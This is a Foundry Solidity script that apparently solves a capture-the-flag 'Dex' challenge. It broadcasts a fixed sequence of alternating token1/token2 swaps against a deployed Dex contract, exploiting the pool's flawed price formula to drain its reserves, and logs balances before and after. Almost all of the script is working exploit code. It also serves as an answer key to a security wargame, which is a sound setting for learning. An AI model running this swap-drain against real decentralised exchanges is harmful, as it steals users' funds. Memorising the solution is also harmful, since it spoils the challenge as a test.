// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Dex.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DexSolution is Script {
    Dex public dex = Dex(0xaCDFe375A2ef372fB39919c77Ab46f6168565212);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Owner : ", dex.owner());
        console.log("Token1 : ", dex.token1());
        console.log("Token2 : ", dex.token2());
        console.log();

        console.log("Before Contract Token1 Balance : ", dex.balanceOf(dex.token1(), address(dex)));
        console.log("Before Contract Token2 Balance : ", dex.balanceOf(dex.token2(), address(dex)));
        console.log();

        console.log("Before Player Token1 Balance : ", dex.balanceOf(dex.token1(), vm.envAddress("MY_ADDRESS")));
        console.log("Before Player Token2 Balance : ", dex.balanceOf(dex.token2(), vm.envAddress("MY_ADDRESS")));
        console.log();

        dex.approve(address(dex), 500);

        dex.swap(dex.token1(), dex.token2(), 10);
        dex.swap(dex.token2(), dex.token1(), 20);
        dex.swap(dex.token1(), dex.token2(), 24);
        dex.swap(dex.token2(), dex.token1(), 30);
        dex.swap(dex.token1(), dex.token2(), 41);
        dex.swap(dex.token2(), dex.token1(), 45);

        console.log("After Contract Token1 Balance : ", dex.balanceOf(dex.token1(), address(dex)));
        console.log("After Contract Token2 Balance : ", dex.balanceOf(dex.token2(), address(dex)));
        console.log();

        console.log("After Player Token1 Balance : ", dex.balanceOf(dex.token1(), vm.envAddress("MY_ADDRESS")));
        console.log("After Player Token2 Balance : ", dex.balanceOf(dex.token2(), vm.envAddress("MY_ADDRESS")));

        vm.stopBroadcast();
    }
}